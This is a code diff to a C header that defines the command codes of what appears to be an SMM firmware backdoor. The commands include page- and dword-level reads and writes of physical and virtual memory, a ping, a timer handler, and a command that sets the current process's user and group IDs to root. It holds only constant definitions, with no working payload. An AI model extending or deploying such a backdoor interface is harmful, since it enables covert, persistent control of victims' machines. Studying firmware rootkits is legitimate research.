@@ -52,17 +52,17 @@ typedef struct _BACKDOOR_INFO
 // test for alive SMM backdoor
 #define BACKDOOR_SW_DATA_PING               0
 
-// read physical memory command
-#define BACKDOOR_SW_DATA_READ_PHYS_MEM      1
+// read physical memory page command
+#define BACKDOOR_SW_DATA_READ_PHYS_PAGE     1
 
-// read virtual memory command
-#define BACKDOOR_SW_DATA_READ_VIRT_MEM      2
+// read virtual memory page command
+#define BACKDOOR_SW_DATA_READ_VIRT_PAGE     2
 
-// write physical memory command
-#define BACKDOOR_SW_DATA_WRITE_PHYS_MEM     3
+// write physical memory page command
+#define BACKDOOR_SW_DATA_WRITE_PHYS_PAGE    3
 
-// write virtual memory command
-#define BACKDOOR_SW_DATA_WRITE_VIRT_MEM     4
+// write virtual memory page command
+#define BACKDOOR_SW_DATA_WRITE_VIRT_PAGE    4
 
 // enable periodic timer handler
 #define BACKDOOR_SW_DATA_TIMER_ENABLE       5
@@ -75,6 +75,18 @@ typedef struct _BACKDOOR_INFO
 
 // set uid/gid/euid/egid of current process to 0
 #define BACKDOOR_SW_DATA_PRIVESC            8
+
+// read physical memory dowrd command
+#define BACKDOOR_SW_DATA_READ_PHYS_DWORD    9
+
+// read virtual memory dowrd command
+#define BACKDOOR_SW_DATA_READ_VIRT_DWORD    10
+
+// write physical memory dowrd command
+#define BACKDOOR_SW_DATA_WRITE_PHYS_DWORD   11
+
+// write virtual memory dowrd command
+#define BACKDOOR_SW_DATA_WRITE_VIRT_DWORD   12
 
 void SerialPrint(char *Message);
 
